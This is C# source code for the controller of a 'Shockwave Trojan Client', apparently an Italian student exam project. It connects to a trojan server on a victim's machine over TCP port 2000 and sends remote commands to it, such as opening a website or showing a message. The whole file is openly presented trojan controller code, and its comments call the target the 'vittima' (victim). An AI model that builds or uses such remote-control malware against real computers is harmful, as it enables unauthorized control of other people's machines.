using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Threading.Tasks;

namespace esame
{
    class Program
    {
        public static bool IsConnected;
        public static NetworkStream Writer;

        public static void SendCommand(string Command)//questo metodo prova a mandare i comandi
        {
            try
            {
                //array dove metto il comando
                byte[] Packet = Encoding.ASCII.GetBytes(Command);

                //mando il comando
                Writer.Write(Packet, 0, Packet.Length);

                Writer.Flush();

            }

            catch
            {
                //non siamo più connessi
                IsConnected = false;

                Console.WriteLine("Disconnected from server!");

                Console.ReadKey();

                //chiudo la connessione
                Writer.Close();

            }
        }
        static void Main(string[] args)
        {
        
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Title = "Shockwave Trojan Client - Offline";

            //è TcpClient, si usa per la connessione
            TcpClient Connector = new TcpClient();

        //etichetta su cui in fondo si fa il salto
        GetConnection:

            //passo come parametro l'ip della vittima datomi dal server in python
            Console.WriteLine("Enter server IP :");
            string IP = Console.ReadLine();

            //provo a connettermi
            try
            {
                //mi connetto all'IP e alla porta 2000
                Connector.Connect(IP, 2000);

                IsConnected = true;

               //serve per scrivere
                Writer = Connector.GetStream();

                //se arrivo qui mi sono connesso
            }

            catch
            {
                //connessione fallita
                Console.WriteLine("Error connecting to target server! Press any key to try again.");
                Console.ReadKey();

                //riprovo a connettermi
                Console.Clear();
                goto GetConnection;
            }

           
            Console.WriteLine("Connessione stabilita a " + IP + ".");
            Console.WriteLine("Type HELP for a list of commands.");

            //sono connesso al server
            while (IsConnected)
            {
                Console.WriteLine("Scrivi comando : ");
                string CMD = Console.ReadLine();

                //comando help
                if (CMD == "HELP")
                {
                    Console.WriteLine("COMMANDS");
                    Console.WriteLine("OPENSITE!!!---http://example.com");
                    Console.WriteLine("MESSAGE!!!---message here");
                }

                //mando il comando
                else

                {
                    //metodo per mandare il comando
                    SendCommand(CMD);
                }

            }
        }
    }
}
